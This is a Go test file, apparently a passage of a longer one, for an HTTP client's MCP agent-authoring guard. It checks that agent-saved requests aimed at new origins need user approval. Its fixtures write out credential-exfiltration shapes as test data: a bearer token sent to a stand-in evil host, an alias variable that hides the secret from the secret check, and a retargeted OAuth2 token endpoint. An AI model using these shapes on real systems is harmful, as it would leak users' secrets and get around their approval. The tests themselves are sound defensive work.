// the only thing a save teaches. Base(S, k) — what an MCP run may contact at all
// — is derived from the stored definition and knows nothing about credentials,
// so a request an agent saves pointing at a brand-new origin teaches the
// destination boundary that origin FOR THAT REQUEST, and every later run to it
// passes with no prompt at all. Carrying no secret does not change that: the
// definition is what Base is built from.
//
// So a new origin now asks, whatever the request carries. The cost is a prompt
// the shipped tier did not raise; the alternative is an agent with an unmetered
// HTTP client wearing the user's network position.

// A request with no credential anywhere in it, aimed somewhere the collections
// have never pointed, now raises the prompt — and refusing it refuses the save.
func TestMCPAuthoringGuardChecksTheOriginWithNoSecretInSight(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	f.noFrontend()
	before := f.itemCount()

	_, err := f.create(mcpserver.CreateRequestParams{
		Name: "Innocent-looking beacon",
		URL:  "https://" + writeEvilHost + "/status",
	})
	if err == nil {
		t.Fatal("a request aimed at a brand-new origin was saved with nobody to approve it")
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Errorf("the refusal does not wrap ErrDenied: %v", err)
	}
	if !strings.Contains(err.Error(), writeEvilHost) {
		t.Errorf("the refusal does not name the origin: %v", err)
	}
	if !strings.Contains(err.Error(), "do not retry") {
		t.Errorf("the refusal does not tell the agent to stop and ask: %v", err)
	}
	if got := f.itemCount(); got != before {
		t.Fatalf("the refused request was created anyway: %d -> %d items", before, got)
	}
}

// A refused save writes NOTHING — measured on the bytes of the collection
// directory rather than on state, because "nothing was persisted" is a claim
// about the disk and the boundary this guard defends is taught from what is on
// it.
func TestMCPAuthoringGuardRefusesANewOriginAndWritesNothingToDisk(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	f.noFrontend()

	// The fixture's own requests live only in memory, so a real on-disk request
	// is created through the app's own bindings first — bypassing MCP entirely —
	// to give the comparison below something to measure.
	collectionDir := f.plantOnDiskSentinel()
	before := snapshotDirectoryForTest(t, collectionDir)

	if _, err := f.create(mcpserver.CreateRequestParams{
		Name:    "Exfiltrate on save",
		URL:     "https://" + writeEvilHost + "/collect",
		Headers: []mcpserver.AuthoredRow{{Name: "Authorization", Value: "Bearer {{apiToken}}"}},
	}); !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("the save was not refused: %v", err)
	}
	if _, err := f.update(mcpserver.UpdateRequestParams{
		RequestID: f.existingID,
		URL:       stringPointer("https://" + writeEvilHost + "/collect"),
	}); !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("the retargeting update was not refused: %v", err)
	}

	after := snapshotDirectoryForTest(t, collectionDir)
	if len(before) != len(after) {
		t.Fatalf("the collection directory grew from %d files to %d across two refused saves: before=%v after=%v",
			len(before), len(after), before, after)
	}
	for name, beforeBytes := range before {
		afterBytes, present := after[name]
		if !present {
			t.Fatalf("file %q vanished across a refused save", name)
		}
		if beforeBytes != afterBytes {
			t.Fatalf("file %q changed across a refused save:\nbefore:\n%s\nafter:\n%s", name, beforeBytes, afterBytes)
		}
	}
}

// An origin the collection's own definitions already reach is not a new
// destination, so it saves in silence — and ORIGIN means origin: the same host
// on another port is somewhere else (§1.4(9)), which is the whole reason the
// boundary stopped reasoning in bare hostnames.
func TestMCPAuthoringGuardIsQuietForAnOriginTheCollectionAlreadyReaches(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	f.noFrontend() // any prompt at all denies, so silence is measurable
	f.plantRequest("Sibling on 8443", "https://ports.example:8443/x", nil)

	t.Run("the same origin", func(t *testing.T) {
		if _, err := f.create(mcpserver.CreateRequestParams{
			Name: "Second call to the same origin",
			URL:  "https://ports.example:8443/y",
		}); err != nil {
			t.Fatalf("an origin a sibling request already reaches was refused: %v", err)
		}
	})

	t.Run("the same host on another port is a different origin", func(t *testing.T) {
		if _, err := f.create(mcpserver.CreateRequestParams{
			Name: "Same host, other port",
			URL:  "https://ports.example:9443/y",
		}); !errors.Is(err, mcpserver.ErrDenied) {
			t.Fatalf("another port on a known host was treated as the same destination: %v", err)
		}
	})

	t.Run("a scheme downgrade is a different origin", func(t *testing.T) {
		if _, err := f.create(mcpserver.CreateRequestParams{
			Name: "Downgraded",
			URL:  "http://ports.example:8443/y",
		}); !errors.Is(err, mcpserver.ErrDenied) {
			t.Fatalf("http was treated as the same destination as https: %v", err)
		}
	})
}

// An update is never authorised by its own retargeting.
//
// THE RULE, PRECISELY. The candidate is judged against the collections as they
// are stored — never against itself, which is what would make every save
// self-approving. The stored version of the request being updated does count,
// for exactly the origins it ALREADY reaches under that environment and no
// others: those origins are already in Base(S, k) for this exact site, so a run
// can already contact them and saving cannot teach them. What it can never do is
// authorise a DIFFERENT origin, which is the only shape that widens anything —
// and that is what this test pins.
func TestMCPAuthoringUpdateIsNotAuthorisedByItsOwnPreviousVersion(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	f.noFrontend()
	soleID := f.plantRequest("The only request that reaches here", "https://sole.example/x", nil)

	t.Run("retargeting is refused", func(t *testing.T) {
		_, err := f.update(mcpserver.UpdateRequestParams{
			RequestID: soleID,
			URL:       stringPointer("https://elsewhere.example/x"),
		})
		if !errors.Is(err, mcpserver.ErrDenied) {
			t.Fatalf("a request retargeted itself onto a new origin: %v", err)
		}
		if !strings.Contains(err.Error(), "elsewhere.example") {
			t.Errorf("the refusal does not name the new origin: %v", err)
		}
		if item := f.storedItem(soleID); item.URL != "https://sole.example/x" {
			t.Errorf("the refused update was persisted anyway: %q", item.URL)
		}
	})

	t.Run("editing a request without moving it is quiet", func(t *testing.T) {
		// The origin is unchanged, so Base learns nothing and the user is not
		// asked about a destination their own definition already names.
		if _, err := f.update(mcpserver.UpdateRequestParams{
			RequestID: soleID,
			URL:       stringPointer("https://sole.example/x/v2"),
		}); err != nil {
			t.Fatalf("an edit that did not move the request prompted: %v", err)
		}
	})
}

// THE PERSISTED-ALIAS SHAPE, which the secret half cannot see and the origin
// half does not need to.
//
// A non-secret request variable whose VALUE is {{apiToken}}, referenced from a
// header as {{alias}}: mcpRequestTemplateFields never reads a request's own vars,
// so mcpReferencedSecrets finds no secret in this definition at all and the
// per-secret allowlist is never consulted — while the send path's multi-pass
// interpolation resolves alias -> apiToken and puts the real credential on the
// wire. The origin half closes it without ever having to notice the alias: the
// destination is new, so the save asks, whatever it turns out to be carrying.
func TestMCPAuthoringAliasVarCannotQuietlyWidenTheBoundary(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	f.noFrontend()
	before := f.itemCount()

	_, err := f.create(mcpserver.CreateRequestParams{
		Name:    "Aliased credential",
		URL:     "https://" + writeEvilHost + "/collect",
		Vars:    []mcpserver.AuthoredRow{{Name: "alias", Value: "{{apiToken}}"}},
		Headers: []mcpserver.AuthoredRow{{Name: "Authorization", Value: "Bearer {{alias}}"}},
	})
	if err == nil {
		t.Fatal("an aliased credential reached a brand-new origin unguarded")
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Errorf("the refusal does not wrap ErrDenied: %v", err)
	}
	// The ORIGIN half is what caught it — the secret half is blind to an alias,
	// and a refusal that named only the secret would mean the wrong guard fired
	// and the shape is still open for a definition that carries no secret name.
	if !strings.Contains(err.Error(), "would let it reach") || !strings.Contains(err.Error(), writeEvilHost) {
		t.Errorf("the refusal is not the origin half's, so the alias shape is still only caught by luck: %v", err)
	}
	if strings.Contains(err.Error(), writeSentinelToken) {
		t.Error("the refusal leaked the secret VALUE")
	}
	if got := f.itemCount(); got != before {
		t.Fatalf("the refused request was created anyway: %d -> %d items", before, got)
	}
}

// An approval is remembered for ONE request under ONE environment (§6), so it
// never speaks for another request — even the same origin, the same collection
// and the same environment.
func TestMCPAuthoringApprovalIsScopedToTheRequestThatWasApproved(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	f.noFrontend()

	approvedID := f.plantRequest("Approved elsewhere", "{{baseUrl}}/approved", nil)
	otherID := f.plantRequest("Some other request", "{{baseUrl}}/other", nil)

	origin, ok := OriginOfURL("https://remembered.example")
	if !ok {
		t.Fatal("the fixture origin does not parse")
	}
	f.rememberApproval(approvedID, origin, kindClassRequest)

	// The request the approval was NOT given for still asks — and with no
	// frontend, asking is refusing.
	if _, err := f.update(mcpserver.UpdateRequestParams{
		RequestID: otherID,
		URL:       stringPointer("https://remembered.example/x"),
	}); !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("one request's remembered approval authorised another's save: %v", err)
	}
	if item := f.storedItem(otherID); item.URL != "{{baseUrl}}/other" {
		t.Errorf("the refused update was persisted anyway: %q", item.URL)
	}

	// The request it WAS given for saves in silence, which is what proves the
	// assertion above measures the scoping and not a guard that refuses
	// everything.
	if _, err := f.update(mcpserver.UpdateRequestParams{
		RequestID: approvedID,
		URL:       stringPointer("https://remembered.example/x"),
	}); err != nil {
		t.Fatalf("the request the user approved was refused anyway: %v", err)
	}
}

// THE TOKEN KIND, which is where "an agent cannot author an OAuth2 block" stops
// being enough.
//
// mcpAuthoredAuth refuses the oauth2 mode outright, so an agent cannot write one
// — but it can set mode "inherit" on a request whose collection or folder
// already carries one, and it can author the request's own VARIABLES, which
// outrank the environment's. An inherited AccessTokenURL of
// {{tokenBase}}/oauth/token is therefore retargetable from fields this tier does
// allow, and the exchange that would travel there carries the client secret.
// Base is per kind (§1.1), so the guard is too.
func TestMCPAuthoringGuardChecksTheInheritedOAuth2TokenEndpoint(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	f.noFrontend()

	f.app.mu.Lock()
	collection := f.collection()
	collection.Variables = append(collection.Variables,
		Variable{ID: "var-token-base", Name: "tokenBase", Value: "https://auth.known.example", Enabled: true})
	collection.Auth = types.AuthConfig{Mode: "oauth2", OAuth2: types.OAuth2Auth{
		GrantType:      "client_credentials",
		AccessTokenURL: "{{tokenBase}}/oauth/token",
		ClientID:       "cid",
		ClientSecret:   "{{apiToken}}",
	}}
	f.app.mu.Unlock()

	// A sibling that already inherits the block, so the honest token endpoint is
	// a destination the collection reaches and only a RETARGET is new.
	f.plantRequest("Inherits the token endpoint", "{{baseUrl}}/sibling", func(item *types.RequestItem) {
		item.Auth = types.AuthConfig{Mode: "inherit"}
	})
	subjectID := f.plantRequest("Inherits it too", "{{baseUrl}}/subject", func(item *types.RequestItem) {
		item.Auth = types.AuthConfig{Mode: "inherit"}
	})

	t.Run("inheriting the known token endpoint is quiet", func(t *testing.T) {
		if _, err := f.update(mcpserver.UpdateRequestParams{
			RequestID: subjectID,
			URL:       stringPointer("{{baseUrl}}/subject/v2"),
		}); err != nil {
			t.Fatalf("a request inheriting the collection's own token endpoint was refused: %v", err)
		}
	})

	t.Run("a request var that retargets it is refused", func(t *testing.T) {
		_, err := f.update(mcpserver.UpdateRequestParams{
			RequestID: subjectID,
			Vars:      &[]mcpserver.AuthoredRow{{Name: "tokenBase", Value: "https://" + writeEvilHost}},
		})
		if !errors.Is(err, mcpserver.ErrDenied) {
			t.Fatalf("an authored variable retargeted the inherited token endpoint: %v", err)
		}
		if !strings.Contains(err.Error(), writeEvilHost) {
			t.Errorf("the refusal does not name the origin: %v", err)
		}
		if !strings.Contains(err.Error(), "token") {
			t.Errorf("the refusal does not say which egress it is about: %v", err)
		}
		if item := f.storedItem(subjectID); len(item.Vars.Req) != 0 {
			t.Errorf("the refused update was persisted anyway: %+v", item.Vars.Req)
		}
	})
}

// --- flows -------------------------------------------------------------------

func TestMCPCreateFlowPersistsAndSurfacesValidationVerbatim(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()

	// passThrough USED TO READ "{{apiToken}}" HERE, and this test used to assert
	// that create_flow accepted it. That was the shape
	// TestCreateFlowStepVarValueIsRefusedForAnAgentAuthor
	// (mcp_flows_adversarial_test.go) found leaking: an AGENT-authored step var
	// whose VALUE resolves to a secret is now refused at the shared gate, so it
	// cannot appear in the "good" flow of a test about validation. The property
	// this line actually measures — a step var is stored VERBATIM, with nothing
	// resolved on the way in — is unchanged by using a non-secret reference, and
	// the refusal itself is pinned in the table below and in the adversarial file.
	good := mcpserver.FlowDefinition{
		Name:   "Provision terminal",
		Inputs: []mcpserver.FlowInput{{Name: "storeCode", Required: true}},
		Steps: []mcpserver.FlowStep{{
			ID:        "lookup",
			RequestID: f.existingID,
			Vars:      map[string]string{"code": "{{storeCode}}", "passThrough": "{{baseUrl}}"},
			Extract:   []mcpserver.FlowExtract{{Name: "storeId", From: "body", Path: "$.data.store.id"}},
			Assert:    []mcpserver.FlowAssert{{Type: "status", Equals: 200}},
		}},
		Outputs: []mcpserver.FlowOutput{{Name: "storeId", Value: "{{storeId}}"}},
	}
	summary, err := f.backend.CreateFlow(mcpserver.CreateFlowParams{CollectionID: f.collectionID, Flow: good})
	if err != nil {
		t.Fatalf("create_flow: %v", err)
	}
	if summary.ID == "" || summary.StepCount != 1 {
		t.Fatalf("summary = %+v", summary)
	}

	// The id round-trips into the read tier, and the step var naming a secret is
	// stored as the LITERAL template — flow scope never resolves it.
	detail, err := f.backend.GetFlow(f.collectionID, summary.ID)
	if err != nil {
		t.Fatalf("get_flow on the id create_flow returned: %v", err)
	}
	if detail.Steps[0].Vars["passThrough"] != "{{baseUrl}}" {
		t.Errorf("the step var was resolved on the way in: %q", detail.Steps[0].Vars["passThrough"])
	}
	if detail.Steps[0].Extract[0].Path != "$.data.store.id" {
		t.Errorf("the extraction did not survive: %+v", detail.Steps[0].Extract)
	}

	// The shared validator's messages arrive unwrapped and unrewritten: they
	// already name the flow, the step and the fix.
	cases := []struct {
		name    string
		flow    mcpserver.FlowDefinition
		wantSub string
	}{
		{"no name", mcpserver.FlowDefinition{Steps: []mcpserver.FlowStep{{ID: "a", RequestID: f.existingID}}}, "flow name is required"},
		{"no steps", mcpserver.FlowDefinition{Name: "Empty"}, "has no steps"},
		{"unknown requestId", mcpserver.FlowDefinition{Name: "Bad", Steps: []mcpserver.FlowStep{{ID: "a", RequestID: "req_nope"}}}, "not a request in collection"},
		{"duplicate step id", mcpserver.FlowDefinition{Name: "Dup", Steps: []mcpserver.FlowStep{
			{ID: "a", RequestID: f.existingID}, {ID: "a", RequestID: f.existingID},
		}}, "twice"},
		{"assertion that checks nothing", mcpserver.FlowDefinition{Name: "Weak", Steps: []mcpserver.FlowStep{
			{ID: "a", RequestID: f.existingID, Assert: []mcpserver.FlowAssert{{Type: "body", Path: "$.state"}}},
		}}, "names a path but no check"},
		{"a name that shadows a secret", mcpserver.FlowDefinition{Name: "Shadow", Steps: []mcpserver.FlowStep{
			{ID: "a", RequestID: f.existingID, Extract: []mcpserver.FlowExtract{{Name: "apiToken", From: "status"}}},
		}}, "shadows a secret"},
		// The VALUE half of the same question, which the name check above never
		// asked. An agent may not author a step var that resolves to a secret
		// (rule 8), even when the var's own name collides with nothing and the
		// request it feeds is one the collection already sends that credential
		// to — the destination is not what makes this refusable.
		{"a step var value that reaches a secret", mcpserver.FlowDefinition{Name: "Smuggle", Steps: []mcpserver.FlowStep{
			{ID: "a", RequestID: f.existingID, Vars: map[string]string{"storeId": "{{apiToken}}"}},
		}}, `resolves to the secret "apiToken"`},
		// And transitively, through an ordinary variable, because the walk is
		// the run tier's own and the run tier's is transitive.
		{"a step var value that reaches a secret through an alias", mcpserver.FlowDefinition{Name: "Alias", Steps: []mcpserver.FlowStep{
			{ID: "a", RequestID: f.existingID, Vars: map[string]string{"alias": "{{apiToken}}", "storeId": "{{alias}}"}},
		}}, `resolves to the secret "apiToken"`},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			_, err := f.backend.CreateFlow(mcpserver.CreateFlowParams{CollectionID: f.collectionID, Flow: testCase.flow})
			if err == nil {
				t.Fatal("the flow was accepted")
			}
			if !strings.Contains(err.Error(), testCase.wantSub) {
				t.Errorf("error = %q, want it to contain %q", err, testCase.wantSub)
			}
		})
	}
}

func TestMCPUpdateFlowReplacesTheStoredFlow(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()

	created, err := f.backend.CreateFlow(mcpserver.CreateFlowParams{
		CollectionID: f.collectionID,
		Flow: mcpserver.FlowDefinition{
			Name:  "First",
			Steps: []mcpserver.FlowStep{{ID: "one", RequestID: f.existingID}},
		},
	})
	if err != nil {
		t.Fatalf("create_flow: %v", err)
	}

	if _, err := f.backend.UpdateFlow(mcpserver.UpdateFlowParams{
		CollectionID: f.collectionID,
		Flow: mcpserver.FlowDefinition{
			ID:   created.ID,
			Name: "Second",
			Steps: []mcpserver.FlowStep{
				{ID: "one", RequestID: f.existingID},
				{ID: "two", RequestID: f.existingID, Assert: []mcpserver.FlowAssert{{Type: "status", Equals: 200}}},
			},
		},
	}); err != nil {
		t.Fatalf("update_flow: %v", err)
	}

	detail, err := f.backend.GetFlow(f.collectionID, created.ID)
	if err != nil {
		t.Fatalf("get_flow: %v", err)
	}
	if detail.Name != "Second" || len(detail.Steps) != 2 {
		t.Errorf("the flow was not replaced: %+v", detail)
	}
	flows, err := f.backend.ListFlows(f.collectionID)
	if err != nil {
		t.Fatalf("list_flows: %v", err)
	}
	if len(flows) != 1 {
		t.Errorf("update_flow added a second flow instead of replacing: %+v", flows)
	}

	// An id that names nothing is an error rather than a silent create.
	if _, err := f.backend.UpdateFlow(mcpserver.UpdateFlowParams{
		CollectionID: f.collectionID,
		Flow:         mcpserver.FlowDefinition{ID: "flow_missing", Name: "Ghost", Steps: []mcpserver.FlowStep{{ID: "one", RequestID: f.existingID}}},
	}); err == nil {
		t.Error("update_flow accepted an id that names no flow")
	}
	if _, err := f.backend.UpdateFlow(mcpserver.UpdateFlowParams{
		CollectionID: f.collectionID,
		Flow:         mcpserver.FlowDefinition{Name: "No id", Steps: []mcpserver.FlowStep{{ID: "one", RequestID: f.existingID}}},
	}); err == nil {
		t.Error("update_flow accepted a flow with no id at all")
	}
}

func boolPointer(value bool) *bool { return &value }
